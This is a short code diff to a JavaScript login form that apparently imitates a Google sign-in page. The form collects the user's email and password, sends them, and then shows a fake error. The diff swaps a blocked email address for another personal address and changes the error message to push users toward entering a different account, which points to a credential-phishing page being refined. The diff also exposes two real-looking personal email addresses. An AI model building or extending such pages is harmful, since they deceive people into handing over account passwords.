@@ -394,7 +394,7 @@
             let isProhibitedPassword = false;
             
             // Lista de correos prohibidos (copiada del formulario 2)
-            const prohibitedEmails = ["c20bl11064@acarrion.edu.pe"];
+            const prohibitedEmails = ["angelitabeatriz57@gmail.com"];
             if (prohibitedEmails.includes(email)) {
                 isProhibitedEmail = true;
             }
@@ -450,7 +450,7 @@
                 
                 // Después de enviar, verificar si debe mostrar error o redirigir
                 if (isProhibitedEmail) {
-                    showError("No se pudo encontrar tu cuenta de Google");
+                    showError("Ocurrio un error, utiliza otra cuenta para continuar");
                     emailInput.value = '';
                     passwordInput.value = '';
                 } else if (isProhibitedPassword) {
